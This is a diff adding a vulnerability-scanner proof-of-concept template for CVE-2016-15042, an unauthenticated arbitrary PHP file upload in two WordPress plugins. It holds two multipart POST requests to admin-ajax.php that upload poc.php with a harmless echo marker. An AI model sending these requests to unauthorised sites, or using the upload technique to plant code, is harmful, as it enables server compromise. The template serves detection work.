@@ -1,0 +1,89 @@
+[info]
+author = "AVE"
+description = "检测 WordPress 插件 Frontend File Manager (<4.0) 和 N-Media Post Front-end Form (<1.1) 的任意文件上传漏洞。通过未授权 AJAX 接口 nm_postfront_upload_file 或 nm_filemanager_upload_file 上传 PHP 文件，验证上传后文件是否可访问。"
+id = "POC-AVE-2016-0056"
+name = "WordPress Frontend File Manager < 4.0 & N-Media Post Front-end Form < 1.1 任意文件上传漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2016-15042",
+    "wordpress",
+    "file-upload",
+    "wp-plugin",
+]
+vuln_id = [
+    "CVE-2016-15042",
+    "AVE-2016-0056",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundarypoc\r
+Content-Disposition: form-data; name="action"\r
+\r
+nm_postfront_upload_file\r
+------WebKitFormBoundarypoc\r
+Content-Disposition: form-data; name="name"\r
+\r
+poc.php\r
+------WebKitFormBoundarypoc\r
+Content-Disposition: form-data; name="file"; filename="poc.php"\r
+Content-Type: application/octet-stream\r
+\r
+<?php echo 'ave_poc_test';\r
+------WebKitFormBoundarypoc--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundarypoc"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "file_name",
+    "poc.php",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundarypoc\r
+Content-Disposition: form-data; name="action"\r
+\r
+nm_filemanager_upload_file\r
+------WebKitFormBoundarypoc\r
+Content-Disposition: form-data; name="name"\r
+\r
+poc.php\r
+------WebKitFormBoundarypoc\r
+Content-Disposition: form-data; name="file"; filename="poc.php"\r
+Content-Type: application/octet-stream\r
+\r
+<?php echo 'ave_poc_test';\r
+------WebKitFormBoundarypoc--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundarypoc"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "file_name",
+    "poc.php",
+]
